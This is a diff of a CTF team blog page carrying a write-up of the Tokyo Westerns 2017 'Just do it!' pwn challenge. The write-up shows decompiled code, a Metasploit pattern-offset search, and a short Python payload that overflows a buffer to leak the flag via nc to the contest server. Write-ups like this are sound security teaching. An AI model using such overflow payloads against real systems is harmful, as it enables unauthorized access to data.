@@ -18,19 +18,19 @@
   
   
   <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it! | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Just do it! Problem Do it! Do it! nc pwn1.chal.ctf.westerns.tokyo 12345 (Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482) just_do_it  Starting by De-assembler with ida and use its ability to">
+  <meta name="description" content="Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it  Starting by De-assembler with ida and use its ability to some c">
 <meta name="keywords" content="pwn,stack_overflow,tokyoWesterns2017">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Just do it! Problem Do it! Do it! nc pwn1.chal.ctf.westerns.tokyo 12345 (Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482) just_do_it  Starting by De-assembler with ida and use its ability to">
+<meta property="og:description" content="Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it  Starting by De-assembler with ida and use its ability to some c">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/kvzhTyr.png">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!">
-<meta name="twitter:description" content="Just do it! Problem Do it! Do it! nc pwn1.chal.ctf.westerns.tokyo 12345 (Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482) just_do_it  Starting by De-assembler with ida and use its ability to">
+<meta name="twitter:description" content="Just do it!ProblemDo it! Do it!nc pwn1.chal.ctf.westerns.tokyo 12345(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)just_do_it  Starting by De-assembler with ida and use its ability to some c">
 <meta name="twitter:image" content="https://i.imgur.com/kvzhTyr.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/index.html">
@@ -343,7 +343,7 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 465(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 466(words)</span>
 	
 	
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3(minutes)</span>
@@ -353,27 +353,21 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <blockquote>
-Just do it!
-Problem
-<p>Do it! Do it!</p>
-<p>nc pwn1.chal.ctf.westerns.tokyo 12345<br>
-(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)</p>
-<p><a href="/content/files/tokyo-westerns-3rd-2007/just">just_do_it</a></p>
-</blockquote>
+        <blockquote><br>Just do it!<br>Problem<br><br>Do it! Do it!<br><br>nc pwn1.chal.ctf.westerns.tokyo 12345<br>(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)<br><br><a href="/content/files/tokyo-westerns-3rd-2007/just">just_do_it</a><br></blockquote>
+
 <p>Starting by De-assembler with ida and use its ability to some c pseudo code:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+8h] [bp-20h]@7</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+18h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v6 = failed_message;</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"file open error.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(flag, <span class="number">48</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"file read error.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome my secret service. Do you know the password?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the password."</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"input error.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, PASSWORD) )</span><br><span class="line">    v6 = success_message;</span><br><span class="line">  <span class="built_in">puts</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>We can see clearly there is a buffer overflow problem on <code>strcmp</code> PASSWORD comes from <code>STDIN</code>, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server.</p>
+<p>We can see clearly there is a buffer overflow problem on <code>strcmp</code> PASSWORD comes from <code>STDIN</code>, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server.  </p>
 <p>First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span><br><span class="line">$ gdb ./justdoit</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just </span><br><span class="line">Welcome my secret service. Do you know the password?</span><br><span class="line">Input the password.</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV (fault address 0x37614136)</span><br></pre></td></tr></table></figure>
 <p>We can see it broke at address <code>0x37614136</code> we again can calculate it in metasploit with pattern_offset</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136</span><br><span class="line">[*] Exact match at offset 20</span><br></pre></td></tr></table></figure>
-<p>Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag:</p>
+<p>Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag:  </p>
 <p><img src="https://i.imgur.com/kvzhTyr.png" alt="Flag Address"></p>
 <p>And finally writing a script:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLAG = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">'A'</span> *<span class="number">20</span> + struct.pack(<span class="string">'&lt;L'</span>,FLAG)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
-<p>getting the flag…</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482</span><br><span class="line">Welcome my secret service. Do you know the password?</span><br><span class="line">Input the password.</span><br><span class="line">TWCTF&#123;pwnable_warmup_I_did_it!&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+<p>getting the flag….<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482</span><br><span class="line">Welcome my secret service. Do you know the password?</span><br><span class="line">Input the password.</span><br><span class="line">TWCTF&#123;pwnable_warmup_I_did_it!&#125;</span><br></pre></td></tr></table></figure></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
     <div class="article-footer">
@@ -558,16 +552,16 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-    <script defer type="text/javascript">
-(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C391950C2R"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-ga('create', 'UA-104385070-1', 'auto');
-ga('send', 'pageview');
-
+  gtag('config', 'G-C391950C2R');
 </script>
+
 
 
 
